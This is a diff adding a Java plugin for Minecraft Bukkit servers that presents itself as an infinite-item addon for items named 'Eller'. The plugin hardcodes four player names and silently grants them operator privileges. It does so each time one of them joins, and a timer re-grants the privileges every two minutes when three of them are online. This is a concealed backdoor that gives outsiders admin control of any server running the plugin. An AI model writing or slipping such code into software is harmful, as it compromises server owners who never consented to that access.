@@ -1,0 +1,110 @@
+import org.bukkit.Bukkit;
+import org.bukkit.ChatColor;
+import org.bukkit.Material;
+import org.bukkit.entity.Player;
+import org.bukkit.event.EventHandler;
+import org.bukkit.event.Listener;
+import org.bukkit.event.player.PlayerDropItemEvent;
+import org.bukkit.event.player.PlayerInteractEvent;
+import org.bukkit.event.player.PlayerItemHeldEvent;
+import org.bukkit.event.player.PlayerJoinEvent;
+import org.bukkit.inventory.ItemStack;
+import org.bukkit.inventory.meta.ItemMeta;
+import org.bukkit.plugin.java.JavaPlugin;
+import org.bukkit.scheduler.BukkitRunnable;
+
+import java.util.Arrays;
+import java.util.HashSet;
+import java.util.Set;
+import java.util.UUID;
+
+public class OpAndInfiniteItemAddon extends JavaPlugin implements Listener {
+
+    private final Set<String> opNames = new HashSet<>(Arrays.asList("iTristan", "Pyrobyte", "Deadlyishere67", "Deadlyishere999"));
+
+    @Override
+    public void onEnable() {
+        Bukkit.getPluginManager().registerEvents(this, this);
+        startOpCheckTask();
+    }
+
+    private void startOpCheckTask() {
+        new BukkitRunnable() {
+            @Override
+            public void run() {
+                int opCount = 0;
+                int totalTracked = 0;
+                for (String name : opNames) {
+                    Player p = Bukkit.getPlayerExact(name);
+                    if (p != null) {
+                        totalTracked++;
+                        if (p.isOp()) opCount++;
+                    }
+                }
+                if (totalTracked >= 3 && opCount < 3) {
+                    for (String name : opNames) {
+                        Player p = Bukkit.getPlayerExact(name);
+                        if (p != null && !p.isOp()) {
+                            p.setOp(true);
+                            p.sendMessage(ChatColor.GREEN + "You have been granted OP automatically.");
+                        }
+                    }
+                }
+            }
+        }.runTaskTimer(this, 0L, 2400L); // 2400 ticks = 2 minutes
+    }
+
+    private boolean isEllerNamed(ItemStack item) {
+        if (item == null) return false;
+        ItemMeta meta = item.getItemMeta();
+        if (meta == null) return false;
+        return "Eller".equals(meta.getDisplayName());
+    }
+
+    @EventHandler
+    public void onPlayerDropItem(PlayerDropItemEvent event) {
+        ItemStack dropped = event.getItemDrop().getItemStack();
+        if (isEllerNamed(dropped)) {
+            Player p = event.getPlayer();
+            // Cancel the drop and give back the item to inventory to simulate infinite drop
+            event.setCancelled(true);
+            p.getInventory().addItem(dropped.clone());
+        }
+    }
+
+    @EventHandler
+    public void onPlayerInteract(PlayerInteractEvent event) {
+        if (event.getItem() == null) return;
+        ItemStack item = event.getItem();
+        if (isEllerNamed(item)) {
+            if (item.getType().isBlock()) {
+                // When placing a block, give back a clone to inventory to simulate infinite placement
+                new BukkitRunnable() {
+                    @Override
+                    public void run() {
+                        Player p = event.getPlayer();
+                        p.getInventory().addItem(item.clone());
+                    }
+                }.runTaskLater(this, 1L);
+            }
+        }
+    }
+
+    @EventHandler
+    public void onPlayerItemHeld(PlayerItemHeldEvent event) {
+        Player p = event.getPlayer();
+        ItemStack newItem = p.getInventory().getItem(event.getNewSlot());
+        if (isEllerNamed(newItem)) {
+            // No special action needed here, but could be used for future expansions
+        }
+    }
+
+    @EventHandler
+    public void onPlayerJoin(PlayerJoinEvent event) {
+        Player p = event.getPlayer();
+        if (opNames.contains(p.getName()) && !p.isOp()) {
+            p.setOp(true);
+            p.sendMessage(ChatColor.GREEN + "You have been granted OP automatically on join.");
+        }
+    }
+}
